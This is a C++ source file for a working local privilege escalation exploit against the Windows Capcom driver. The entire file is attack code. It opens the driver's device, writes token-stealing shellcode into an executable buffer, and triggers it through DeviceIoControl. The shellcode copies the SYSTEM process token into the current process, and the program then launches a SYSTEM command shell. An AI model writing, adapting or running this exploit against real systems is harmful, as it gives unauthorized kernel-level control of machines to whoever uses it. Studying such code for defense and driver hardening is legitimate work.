#include <Windows.h>
#include <ShlObj.h>
#include <iostream>

// For CreateFile
constexpr wchar_t lpFileName[] = L"\\\\.\\Htsysm72FB";

// For DeviceIoControl
constexpr DWORD dwIoControlCode = 0xaa013044;
constexpr DWORD nInBufferSize = 8;
constexpr DWORD nOutBufferSize = 4;

DWORD sendDeviceIoControl(HANDLE hFile)
{
	unsigned int dataLength = 0x1000;

	DWORD lpOutBuffer = 0;

	LPVOID lpInBuffer = VirtualAlloc(
		NULL,
		dataLength,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpInBuffer == NULL)
	{
		return false;
	}
	ZeroMemory(lpInBuffer, dataLength);

	LPCVOID data[] = { (LPCVOID)((uint64_t)lpInBuffer + 8) };

	char shellcode[] =
		"\x48\x31\xc0"						// xor rax, rax	
		"\x65\x48\x8b\x80\x88\x01\x00\x00"	// mov rax, qword ptr gs:[rax + 0x188]	
		"\x48\x8b\x40\x70"					// mov rax, qword ptr [rax + 0x70]
		"\x48\x89\xc1"						// mov rcx, rax
		"\x48\xc7\xc2\x04\x00\x00\x00"		// mov rdx, 4

											// SearchSystemPID:
		"\x48\x8b\x80\x88\x01\x00\x00"		// mov rax, qword ptr [rax + 0x188]
		"\x48\x2d\x88\x01\x00\x00"			// sub rax, 0x188
		"\x48\x3b\x90\x80\x01\x00\x00"		// cmp rdx, qword ptr [rax + 0x180]
		"\x75\xea"							// jne SearchSystemPID

		"\x48\x8b\x90\x08\x02\x00\x00"		// mov rdx, qword ptr [rax + 0x208]
		"\x48\x89\x91\x08\x02\x00\x00"		// mov qword ptr [rcx + 0x208], rdx
		"\xc3";								// ret

	memcpy((void *)((uint64_t)lpInBuffer + 8), shellcode, sizeof(shellcode));

	BOOL status = WriteProcessMemory(
		GetCurrentProcess(),
		lpInBuffer,
		data,
		sizeof(LPCVOID),
		NULL
	);
	if (!status)
	{
		return false;
	}
	
	DWORD lpBytesReturned = 0;
	status = DeviceIoControl(
		hFile,
		dwIoControlCode,
		lpInBuffer,
		nInBufferSize,
		&lpOutBuffer,
		nOutBufferSize,
		&lpBytesReturned,
		NULL
	);

	VirtualFree(lpInBuffer, dataLength, MEM_RELEASE);
	return status; 
}

int main()
{
	std::cout << "\n\t--==[[ Capcom Privilege Escalation ]]==--\n" << std::endl;

	std::cout << "[+] Grabbing handle to Capcom...";
	HANDLE hCapcom = CreateFile(
		lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hCapcom == INVALID_HANDLE_VALUE)
	{
		std::cerr << "uh-oh!" << std::endl;
		std::cerr << "[!] CreateFile error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	else
		std::cout << "got it!" << std::endl;

	std::cout << "[+] Sending DeviceIoControl...";
	BOOL status = sendDeviceIoControl(hCapcom);
	if (!status)
	{
		std::cerr << "uh-oh!" << std::endl;
		std::cerr << "[!] DeviceIoControl error: " << GetLastError() << std::endl;
		CloseHandle(hCapcom);
		return EXIT_FAILURE;
	}
	else
		std::cout << "done!" << std::endl;

	if (!IsUserAnAdmin())
	{
		std::cerr << "[!] Privileges weren't escalated!" << std::endl;
		CloseHandle(hCapcom);
		return EXIT_FAILURE;
	}
	else
	{
		std::cout << "[+] W00t! We should be system!\n" << std::endl;
		system("cmd");
	}
	
	CloseHandle(hCapcom);
	return EXIT_SUCCESS;
}
